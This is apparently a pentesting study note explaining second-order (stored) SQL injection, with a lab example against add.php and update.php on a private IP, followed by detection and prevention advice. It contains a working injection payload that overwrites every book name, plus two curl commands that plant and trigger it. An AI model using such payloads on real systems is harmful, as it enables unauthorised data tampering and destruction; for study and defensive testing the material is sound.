
outband
==

# Second-Order SQL Injection (Stored SQLi)

## 📌 Definition
Second-Order SQL Injection occurs when malicious input is **stored in a database** and later reused in another SQL query, where it finally executes.  
Unlike classic SQLi, the payload does **not trigger immediately**, making detection harder.

---

## 🔁 How It Works (Workflow)
1. Attacker submits crafted input (e.g., via `add.php`).
2. Application stores the data safely.
3. Data is later retrieved and used in another SQL query (e.g., `update.php`).
4. Injected SQL executes at this later stage.

---

## ⚠️ Impact
- Bypasses front-end validation.
- Stealthy and delayed execution.
- Can modify or delete large amounts of data.
- Harder to trace back to original input source.

---

## 🧪 Example Attack
Payload stored during insertion:

12345'; UPDATE books SET book_name='Hacked'; --


Later reused in an UPDATE query, causing:
- Query termination (`;`)
- Injection of new SQL command.
- Commenting out remaining code (`--`)
- All book names changed.

---

## 🖥️ Pentesting Commands & Payloads

### ▶️ Manual Form Injection
Insert payload into a field that gets reused later (e.g., `ssn`):

12345'; UPDATE books SET book_name='Hacked'; --


---

### ▶️ cURL – Insert Malicious Record

```bash
curl -X POST http://10.65.150.172/second/add.php \
 -d "ssn=12345'; UPDATE books SET book_name='Hacked'; --" \
 -d "book_name=Test" \
 -d "author=Attacker"

▶️ Trigger Execution (Update Function)

curl -X POST http://10.65.150.172/second/update.php \
 -d "update=1" \
 -d "ssn_1=12345'; UPDATE books SET book_name='Hacked'; --" \
 -d "new_book_name=Testing" \
 -d "new_author=Hacker"

▶️ Detection Strategy

Test whether:

    Stored input is reused in later queries.

    Multi-statement queries are allowed.

    Backend trusts DB data.

    Logs or admin panels re-execute values.

🔍 Why It Happens

    No prepared statements.

    Reliance on real_escape_string().

    Stored data trusted later.

    Multi-query execution enabled.

🛡️ Prevention

    Use Prepared Statements / Parameterized Queries.

    Validate input at every usage point.

    Treat stored data as untrusted.

    Disable multi-query execution.

    Apply strict backend validation.

🎯 Pentester Focus

    Track data flow across endpoints.

    Map where values are reused.

    Look for update/search/export features.

    Test admin functionality.